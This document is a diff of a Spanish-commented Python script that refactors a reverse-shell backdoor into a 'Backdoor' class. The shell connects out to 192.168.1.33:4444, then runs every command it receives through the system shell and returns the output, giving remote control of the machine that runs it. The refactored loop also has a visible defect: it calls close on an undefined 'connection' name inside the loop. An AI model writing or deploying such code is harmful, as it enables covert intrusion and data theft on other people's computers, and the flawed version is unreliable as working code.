@@ -6,24 +6,29 @@
 # COMPATIBILIDAD: Windows + Linux
 # =============================================================================
 
+import socket, subprocess, sys
 
-#!/usr/bin/env python3
-import socket, subprocess, sys 
+class Backdoor:
 
-def ejecutarComando(command):
-    command_str = command.decode('utf-8', errors='ignore')
-    return subprocess.check_output(command_str, shell=True)
+    def __init__(self,ip,port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip,port))  # ← ✅ IP CORRECTA (tu Manjaro)
+        self.connection.send(b" \n [+]Conexion Exitosamente Establecida \n")
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-connection.connect(("192.168.1.33", 4444))  # ← ✅ IP CORRECTA (tu Manjaro)
-connection.send(" \n [+]Conexion Exitosamente Establecida \n".encode('utf-8')) 
+    def ejecutarComando(self,command):
+        try:
+            command_str = command.decode('utf-8', errors='ignore').strip()
+            return subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT)
+        except Exception as e:
+            # ← ✅ Si falla, devolver el error en vez de crashear
+            return str(e).encode('utf-8')
 
-while True: 
-    command = connection.recv(1024000)  # ← ✅ CAMBIADO DE 1024 A 1024000 (1 MB)
-    try: 
-        resultadosComando = ejecutarComando(command)
-    except Exception as e:
-        resultadosComando = str(e).encode('utf-8')
-    connection.send(resultadosComando) 
+    def run(self):
+        while True: 
+            command = self.connection.recv(1024000)  # ← ✅ CAMBIADO DE 1024 A 1024000 (1 MB)
+            resultadosComando = self.ejecutarComando(command)
+            self.connection.send(resultadosComando)          
+            connection.close()
 
-connection.close()
+puerta = Backdoor("192.168.1.33",4444)
+puerta.run()
